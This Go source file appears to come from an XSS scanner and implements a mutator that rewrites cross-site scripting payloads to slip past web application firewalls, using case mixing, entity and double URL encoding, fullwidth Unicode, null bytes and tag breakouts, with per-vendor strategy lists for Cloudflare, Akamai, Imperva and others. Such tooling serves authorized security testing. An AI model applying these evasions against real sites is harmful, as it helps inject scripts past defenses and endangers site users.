// Package payload provides encoding mutations for WAF bypass.
package payload

import (
	"fmt"
	"net/url"
	"strings"
	"unicode"

	ctx "github.com/xsscan/xsscan/pkg/context"
)

// MutationType identifies a WAF bypass strategy at compile time.
type MutationType string

const (
	MutationEntityAngleBrackets MutationType = "entity_angle_brackets"
	MutationCaseMix             MutationType = "case_mix"
	MutationSpaceToSlash        MutationType = "space_to_slash"
	MutationTabInjection        MutationType = "tab_injection"
	MutationBacktickFn          MutationType = "backtick_fn"
	MutationBreakoutTextarea    MutationType = "breakout_textarea"
	MutationCommentInjection    MutationType = "comment_injection"
	MutationAltFunction         MutationType = "alt_function"
	MutationStringConcat        MutationType = "string_concat"
	MutationNewlineInjection    MutationType = "newline_injection"
	MutationEntityPlusCase      MutationType = "entity_plus_case"
	// Encoding-layer mutations: transform the payload representation to bypass
	// WAFs that inspect the literal bytes but don't decode before matching.
	MutationDoubleURLEncode  MutationType = "double_url_encode"
	MutationUnicodeFullwidth MutationType = "unicode_fullwidth"
	MutationHTMLEntityNested MutationType = "html_entity_nested"
	MutationUnicodeEscapeJS  MutationType = "unicode_escape_js"
	MutationHexEntityMixed   MutationType = "hex_entity_mixed"
	MutationNullByteInjection MutationType = "null_byte_injection"
)

// Mutation represents a single encoded variant of a payload.
type Mutation struct {
	Value  string
	Type   MutationType // mutation type identifier
	Bypass string       // what WAF pattern this attempts to bypass
}

// Mutator generates encoded variants of payloads for WAF bypass.
type Mutator struct{}

// NewMutator creates a new Mutator.
func NewMutator() *Mutator {
	return &Mutator{}
}

// mutationStrategy defines a single WAF bypass strategy with its applicability
// check and transformation function. The table-driven approach eliminates the 11
// if-blocks that would otherwise need to be maintained in lock-step.
type mutationStrategy struct {
	name    MutationType
	bypass  string
	applies func(payload string, isHTML, isJS bool) bool
	apply   func(payload string) string
}

// strategies is the ordered table of all WAF bypass mutations.
// Order matters: simpler/cheaper mutations first, compound ones last.
var strategies = []mutationStrategy{
	{
		name:   MutationEntityAngleBrackets,
		bypass: "WAF that blocks literal <> but not HTML entities",
		applies: func(payload string, isHTML, _ bool) bool {
			return isHTML && strings.ContainsAny(payload, "<>")
		},
		apply: encodeAngleBrackets,
	},
	{
		name:   MutationCaseMix,
		bypass: "Case-sensitive keyword filters (e.g. 'onerror' vs 'oNeRrOr')",
		applies: func(payload string, isHTML, _ bool) bool {
			return isHTML && strings.ContainsFunc(payload, unicode.IsLetter)
		},
		apply: mixCase,
	},
	{
		name:   MutationSpaceToSlash,
		bypass: "WAF that matches 'onerror=' but not 'onerror/'",
		applies: func(payload string, isHTML, _ bool) bool {
			return isHTML && strings.Contains(payload, " ")
		},
		apply: func(p string) string { return strings.ReplaceAll(p, " ", "/") },
	},
	{
		name:   MutationTabInjection,
		bypass: "Line-based WAF regex that doesn't match across tabs",
		applies: func(payload string, isHTML, _ bool) bool {
			return isHTML && (strings.Contains(payload, " onerror") ||
				strings.Contains(payload, " src=") ||
				strings.Contains(payload, " onload"))
		},
		apply: applyTabInjection,
	},
	{
		name:   MutationBacktickFn,
		bypass: "WAF that blocks parens but not template literals",
		applies: func(payload string, _, isJS bool) bool {
			return isJS && strings.Contains(payload, "alert(")
		},
		apply: func(p string) string { return strings.Replace(p, "alert(", "alert`", 1) },
	},
	{
		name:   MutationBreakoutTextarea,
		bypass: "Breakout from textarea/title/style injection contexts",
		applies: func(payload string, isHTML, _ bool) bool {
			return isHTML && strings.HasPrefix(payload, "<")
		},
		apply: func(p string) string { return "</textarea>" + p },
	},
	{
		name:   MutationCommentInjection,
		bypass: "WAF that matches 'tag attr' but not 'tag /* */attr'",
		applies: func(payload string, isHTML, _ bool) bool {
			return isHTML && strings.Contains(payload, " onerror")
		},
		apply: applyCommentInjection,
	},
	{
		name:   MutationAltFunction,
		bypass: "WAF that blocks alert() but not confirm()/prompt()",
		applies: func(payload string, _, _ bool) bool {
			return strings.Contains(payload, "alert(")
		},
		apply: func(p string) string { return strings.Replace(p, "alert(", "confirm(", 1) },
	},
	{
		name:   MutationStringConcat,
		bypass: "WAF that blocks literal 'alert' but not concatenated strings",
		applies: func(payload string, _, isJS bool) bool {
			// Only applies to payloads the transform can actually handle
			return isJS && strings.Contains(payload, "alert(1)")
		},
		apply: func(p string) string { return strings.Replace(p, "alert(1)", "eval('ale'+'rt(1)')", 1) },
	},
	{
		name:   MutationNewlineInjection,
		bypass: "WAF that doesn't match across newlines",
		applies: func(payload string, isHTML, _ bool) bool {
			return isHTML && strings.Contains(payload, "<img ")
		},
		apply: applyNewlineInjection,
	},
	// Encoding-layer mutations
	{
		name:   MutationDoubleURLEncode,
		bypass: "WAF that URL-decodes once before inspection (server double-decodes)",
		applies: func(payload string, _, _ bool) bool {
			return strings.ContainsAny(payload, "<>\"'()")
		},
		apply: doubleURLEncode,
	},
	{
		name:   MutationUnicodeFullwidth,
		bypass: "WAF that doesn't normalize fullwidth Unicode characters",
		applies: func(payload string, _, _ bool) bool {
			return len(payload) >= 3
		},
		apply: toFullwidth,
	},
	{
		name:   MutationHTMLEntityNested,
		bypass: "WAF that decodes HTML entities once, server decodes twice",
		applies: func(payload string, isHTML, _ bool) bool {
			return isHTML && strings.ContainsAny(payload, "<>\"'&")
		},
		apply: nestHTMLEntities,
	},
	{
		name:   MutationUnicodeEscapeJS,
		bypass: "WAF that doesn't decode \\uXXXX escapes in JS strings",
		applies: func(payload string, _, isJS bool) bool {
			return isJS && strings.Contains(payload, "alert")
		},
		apply: unicodeEscapeJS,
	},
	{
		name:   MutationHexEntityMixed,
		bypass: "WAF that matches named entities but not hex entities",
		applies: func(payload string, isHTML, _ bool) bool {
			return isHTML && strings.ContainsAny(payload, "<>")
		},
		apply: encodeHexEntities,
	},
	{
		name:   MutationNullByteInjection,
		bypass: "Legacy WAF that truncates at null byte",
		applies: func(payload string, isHTML, _ bool) bool {
			return isHTML && strings.HasPrefix(payload, "<")
		},
		apply: injectNullByte,
	},
	{
		name:   MutationEntityPlusCase,
		bypass: "Compound: entity encoding + case mixing",
		applies: func(payload string, isHTML, _ bool) bool {
			return isHTML && strings.ContainsAny(payload, "<>") && strings.ContainsFunc(payload, unicode.IsLetter)
		},
		apply: func(p string) string { return mixCase(encodeAngleBrackets(p)) },
	},
}

// Mutate generates encoding variants of the given payload for the specified context.
// Returns up to `maxVariants` mutations (0 = all).
//
// Context-awareness ensures mutations are only generated for contexts where they
// can actually execute. For example, HTML entity encoding is inert in JS contexts,
// and string concatenation is inert in HTML body contexts. Generating context-invalid
// mutations wastes scan requests on payloads that can never work.
func (m *Mutator) Mutate(payload string, contextType ctx.ContextType, maxVariants int) []Mutation {
	isHTML := isHTMLContext(contextType)
	isJS := isJSContext(contextType)

	mutations := make([]Mutation, 0, len(strategies))
	for _, s := range strategies {
		if !s.applies(payload, isHTML, isJS) {
			continue
		}
		mutations = append(mutations, Mutation{
			Value:  s.apply(payload),
			Type:   s.name,
			Bypass: s.bypass,
		})
	}

	if maxVariants > 0 && len(mutations) > maxVariants {
		return mutations[:maxVariants]
	}
	return mutations
}

// MutateTargeted generates mutations filtered to those effective against a specific WAF.
// When wafName is empty or unknown, falls back to context-appropriate mutations.
// This avoids wasting scan requests on mutations that are ineffective against the
// detected WAF (e.g., entity encoding against a WAF that decodes entities before inspection).
func (m *Mutator) MutateTargeted(payload string, contextType ctx.ContextType, wafName string, maxVariants int) []Mutation {
	all := m.Mutate(payload, contextType, 0)
	if wafName == "" {
		return all
	}

	// Filter to WAF-specific strategies when available
	wafStrategies := GetWAFStrategies(wafName)
	if len(wafStrategies) == 0 {
		return all // unknown WAF, try everything
	}

	strategySet := make(map[MutationType]bool, len(wafStrategies))
	for _, s := range wafStrategies {
		strategySet[s] = true
	}

	var filtered []Mutation
	for _, mut := range all {
		if strategySet[mut.Type] {
			filtered = append(filtered, mut)
		}
	}
	if len(filtered) == 0 {
		return all // all filtered out, fall back to full set
	}
	if maxVariants > 0 && len(filtered) > maxVariants {
		return filtered[:maxVariants]
	}
	return filtered
}

// GetWAFStrategies maps a WAF name to its effective mutation types.
//
// NOTE: This mapping parallels BypassStrategies in pkg/verify/waf.go.
// The two must be kept in sync — pkg/verify imports pkg/payload (for
// payload.Payload type), so pkg/payload cannot import pkg/verify here.
//
// When updating WAF strategies, update both locations. The sync is enforced
// by TestWAFStrategiesSync in pkg/verify/waf_test.go which compares this
// function's output against verify.GetWAFStrategies() for every known WAF.
func GetWAFStrategies(wafName string) []MutationType {
	switch wafName {
	case "Cloudflare":
		// Cloudflare decodes HTML entities before inspection, so entity_angle_brackets
		// and entity_plus_case are ineffective. Focus on structural bypasses.
		// NOTE: Must match BypassStrategies in pkg/verify/waf.go exactly.
		return []MutationType{MutationCaseMix, MutationCommentInjection, MutationAltFunction, MutationTabInjection, MutationBreakoutTextarea}
	case "AWS WAF":
		return []MutationType{MutationBreakoutTextarea, MutationAltFunction, MutationEntityPlusCase, MutationNewlineInjection, MutationBacktickFn}
	case "Akamai":
		return []MutationType{MutationTabInjection, MutationNewlineInjection, MutationCommentInjection, MutationCaseMix, MutationSpaceToSlash}
	case "ModSecurity":
		return []MutationType{MutationNewlineInjection, MutationTabInjection, MutationSpaceToSlash, MutationEntityAngleBrackets, MutationStringConcat}
	case "F5 BIG-IP":
		return []MutationType{MutationCaseMix, MutationCommentInjection, MutationTabInjection, MutationAltFunction, MutationEntityAngleBrackets}
	case "Imperva":
		return []MutationType{MutationEntityPlusCase, MutationBreakoutTextarea, MutationCommentInjection, MutationNewlineInjection, MutationBacktickFn}
	case "Sucuri":
		return []MutationType{MutationCaseMix, MutationSpaceToSlash, MutationTabInjection, MutationAltFunction, MutationEntityAngleBrackets}
	case "Wordfence":
		return []MutationType{MutationEntityAngleBrackets, MutationEntityPlusCase, MutationBreakoutTextarea, MutationCommentInjection, MutationStringConcat}
	}
	return nil
}

// applyTabInjection inserts tabs between tag and event handlers.
// Returns the original string if no substitution was made.
func applyTabInjection(payload string) string {
	v := strings.ReplaceAll(payload, " onerror", "\tonerror")
	v = strings.ReplaceAll(v, " src=", "\tsrc=")
	v = strings.ReplaceAll(v, " onload", "\tonload")
	return v
}

// applyCommentInjection inserts /*x*/ between tag and first attribute.
// Returns the original string if no substitution was made.
func applyCommentInjection(payload string) string {
	return strings.Replace(payload, " onerror", " /*x*/onerror", 1)
}

// applyNewlineInjection replaces space after tag name with newline.
// Returns the original string if no substitution was made.
func applyNewlineInjection(payload string) string {
	return strings.Replace(payload, "<img ", "<img\n", 1)
}

// isHTMLContext returns true for contexts where HTML parsing applies.
func isHTMLContext(ctxType ctx.ContextType) bool {
	switch ctxType {
	case ctx.ContextHTMLBody, ctx.ContextHTMLTag, ctx.ContextHTMLAttrName,
		ctx.ContextHTMLAttrValue, ctx.ContextURLAttr, ctx.ContextSVGContainer,
		ctx.ContextMathMLContainer, ctx.ContextCSSBlock, ctx.ContextCSSValue,
		ctx.ContextTemplate:
		return true
	}
	return false
}

// isJSContext returns true for contexts where JavaScript parsing applies.
func isJSContext(ctxType ctx.ContextType) bool {
	switch ctxType {
	case ctx.ContextJSString, ctx.ContextJSBlock, ctx.ContextJSComment:
		return true
	}
	return false
}

// encodeAngleBrackets replaces < and > with HTML entities.
// This is effective in attribute contexts where the browser decodes
// entities after the WAF has already inspected the raw input.
func encodeAngleBrackets(s string) string {
	s = strings.ReplaceAll(s, "<", "&#60;")
	s = strings.ReplaceAll(s, ">", "&#62;")
	return s
}

func mixCase(s string) string {
	var b strings.Builder
	upper := true
	for _, c := range s {
		if unicode.IsLetter(c) {
			if upper {
				b.WriteRune(unicode.ToUpper(c))
			} else {
				b.WriteRune(unicode.ToLower(c))
			}
			upper = !upper
		} else {
			b.WriteRune(c)
		}
	}
	return b.String()
}

// doubleURLEncode applies a second layer of URL encoding so that a server
// that decodes once still produces encoded metacharacters for the app.
func doubleURLEncode(s string) string {
	return url.PathEscape(url.PathEscape(s))
}

// toFullwidth converts ASCII to fullwidth Unicode equivalents (U+FF01–U+FF5E).
// Some WAFs don't normalize these before matching.
// Offset: U+FF01 (fullwidth '!') − U+0021 (ASCII '!') = 0xFEE0
func toFullwidth(s string) string {
	var b strings.Builder
	for _, ch := range s {
		if ch >= 0x21 && ch <= 0x7E {
			b.WriteRune(ch + 0xFEE0)
		} else {
			b.WriteRune(ch)
		}
	}
	return b.String()
}

// nestHTMLEntities double-encodes HTML entities so that the server's first
// decode produces literal &lt; &gt; strings that the browser then decodes.
func nestHTMLEntities(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&amp;lt;")
	s = strings.ReplaceAll(s, ">", "&amp;gt;")
	s = strings.ReplaceAll(s, "\"", "&amp;quot;")
	s = strings.ReplaceAll(s, "'", "&amp;#39;")
	return s
}

// unicodeEscapeJS converts "alert" to "\u0061\u006c\u0065\u0072\u0074" etc.
func unicodeEscapeJS(s string) string {
	var b strings.Builder
	for _, ch := range s {
		if (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') {
			b.WriteString(fmt.Sprintf("\\u%04x", ch))
		} else {
			b.WriteRune(ch)
		}
	}
	return b.String()
}

// encodeHexEntities replaces < and > with hex entity equivalents.
func encodeHexEntities(s string) string {
	s = strings.ReplaceAll(s, "<", "&#x3C;")
	s = strings.ReplaceAll(s, ">", "&#x3E;")
	return s
}

// injectNullByte inserts a null byte after the opening tag name to truncate
// legacy WAF pattern matching without affecting browser parsing.
func injectNullByte(s string) string {
	idx := strings.Index(s, "<")
	if idx < 0 {
		return s
	}
	// Find end of tag name — include '/' for self-closing/slash-form payloads
	end := strings.IndexAny(s[idx:], " >\t\n/")
	if end < 0 {
		return s
	}
	return s[:idx+end] + "\x00" + s[idx+end:]
}
